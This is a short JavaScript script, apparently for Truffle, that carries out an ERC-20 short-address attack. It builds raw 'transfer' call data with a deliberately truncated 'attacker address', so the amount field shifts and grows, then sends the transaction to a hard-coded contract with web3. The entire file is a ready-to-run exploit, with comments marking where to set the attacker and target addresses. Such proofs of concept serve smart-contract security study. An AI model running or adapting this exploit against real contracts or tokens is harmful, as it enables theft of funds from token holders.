module.exports = function(callback) {

    let modifiedArgs = [
        '0xa9059cbb',
        // attacker provider address without 00 on the end
        '0000000000000000000000007105226DE02bEC448fEbF1B8b2703D7998B101', // SET! Attacker address
        '0000000000000000000000000000000000000000000000000000000000000001'
    ];
    
    modifiedData = modifiedArgs.join("");

    web3.eth.sendTransaction({
        to: "0xe0A291AdFDed431A6184F4C7A5d1e4Cd85d99AE0", // SET! Contract should be deployed
        data : modifiedData,
        gas : 1185919
    }, function(err, transactionHash) {
        if (err) { 
            console.error(err); 
        } else {
            console.log(transactionHash);
        }
    });

    callback();
};